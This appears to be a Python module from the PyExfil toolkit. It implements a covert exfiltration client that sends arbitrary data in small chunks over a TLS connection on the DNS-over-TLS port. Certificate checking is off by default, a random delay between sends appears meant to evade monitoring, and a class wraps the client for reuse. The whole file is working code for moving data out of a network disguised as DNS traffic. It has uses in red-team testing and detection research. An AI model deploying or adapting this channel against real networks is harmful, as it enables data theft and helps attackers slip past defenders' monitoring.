#!/usr/bin/env python3

import sys
import ssl
import time
import socket
import random

from pyexfil.includes.base import CommModule
from pyexfil.includes.prepare import _splitString

try:
    from pyexfil.Comm.DNSoTLS.constants import (
        DNS_OVER_TLS_PORT,
        CHUNK_SIZE,
        CHECK_CERT,
    )
except ImportError:
    from constants import DNS_OVER_TLS_PORT, CHUNK_SIZE, CHECK_CERT


def Send(data, server, port=DNS_OVER_TLS_PORT, certCheck=CHECK_CERT):

    if isinstance(data, str):
        data = data.encode("utf-8")

    if len(data) > CHUNK_SIZE:
        chunks = _splitString(stri=data, length=16)
    else:
        chunks = [data]

    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    if not certCheck:
        context.verify_mode = ssl.CERT_NONE

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        sock.settimeout(5)
        wrappedSocket = context.wrap_socket(sock)
    except Exception as e:
        sys.stderr.write("Something went wrong.\n")
        sys.stderr.write(str(e))
        return False

    try:
        wrappedSocket.connect((server, port))
    except socket.error as se:
        sys.stderr.write(
            "Could not connect to %s:%s (probably comm error).\n" % (server, port)
        )
        sys.stderr.write(str(se))
        return False
    except Exception as e:
        sys.stderr.write(
            "Could not connect to %s:%s (probably cert error).\n" % (server, port)
        )
        sys.stderr.write(str(e))
        return False

    for chunk in chunks:
        """
        This is where the data is recvd. When you want to teach it to handle
        returns this is where you need to harvest it. Just create a call to a
        wrappedSocket.recv() to send incoming data wherever you want.
        * Just remember that the server automatically sends back random data.
          You should account for that on your end.
        """
        if isinstance(chunk, str):
            chunk = chunk.encode("utf-8")
        wrappedSocket.send(chunk)
        time.sleep(random.random())
    wrappedSocket.close()
    return True


class DNSoTLSComm(CommModule):

    MODULE_NAME = "DNSoTLSComm"
    PROTOCOL    = "dns-over-tls"

    def __init__(self, host, port=DNS_OVER_TLS_PORT, cert_check=False, verbose=False):
        """
        :param host:       Server hostname or IP [str]
        :param port:       TLS port [int]
        :param cert_check: Whether to verify the server certificate [bool]
        """
        super().__init__(enc_key="", on_message=None, verbose=verbose)
        self.host      = host
        self.port      = port
        self.cert_check = cert_check

    def _send_impl(self, data, **kwargs):
        return Send(
            data=data,
            server=self.host,
            port=self.port,
            certCheck=self.cert_check,
        )

    def _broadcast_impl(self, data, **kwargs):
        return self._send_impl(data)

    def _listen_impl(self, callback, **kwargs):
        raise NotImplementedError(
            "DNSoTLSComm is a client-only module. Use DNSoTLSServer for receiving."
        )


if __name__ == "__main__":
    sys.stdout.write("Running in SA mode. Every return key is a send.\n")
    while True:
        try:
            send_me = input("[ ]\t")
            c = Send(send_me.strip(), server="127.0.0.1", port=DNS_OVER_TLS_PORT)
            if c:
                sys.stdout.write("{thank you, Dave}\n")
            else:
                sys.stderr.write("{i cannot open that door, Dave}\n")
        except KeyboardInterrupt:
            sys.stdout.write("Caught CTRL+C. Exiting now...\n")
            sys.exit()
